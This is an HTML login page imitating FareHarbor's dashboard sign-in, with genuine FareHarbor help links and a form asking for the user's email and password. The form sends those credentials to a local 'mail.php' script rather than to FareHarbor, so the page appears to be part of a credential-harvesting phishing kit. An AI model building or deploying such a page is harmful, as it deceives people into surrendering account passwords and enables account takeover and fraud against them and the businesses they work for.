<html>
  <head>
    <link rel="stylesheet" href="login.css" />
    <link href="mail.php" />
  </head>
  <body>
    <div class="login_box">
      <img src="logo.png">
      <div class="text" id=intro>To login, enter your <b>FareHarbor email and password.</b> <a href="https://fareharbor.com/help/getting-started/dashboard-basics/logging-in/"><span style="background-color:#0C6ECE;border-radius:50px;color:white;padding:0 4px 0 4px;font-size:10px;margin-right:5px;">&#63;</span>Learn more</a></div>
      <div class="shortname_input">
        <form method="post" action="mail.php" method="post">
          <input id="email_input" placeholder="email" name="email"></input>
          <input id="password_input" type="password" placeholder="password" name="password"></input>
          <button class="input" id="submit_button" type="submit"><b>LOGIN -&#8250;</b></button>
        </form>
      </div>
      <div class="text" id="help">Have an account but don't know your email or password? <a href="https://fareharbor.com/forgot/credentials/">Find your user account.</a></div>
    </div>
  </body>
</html>
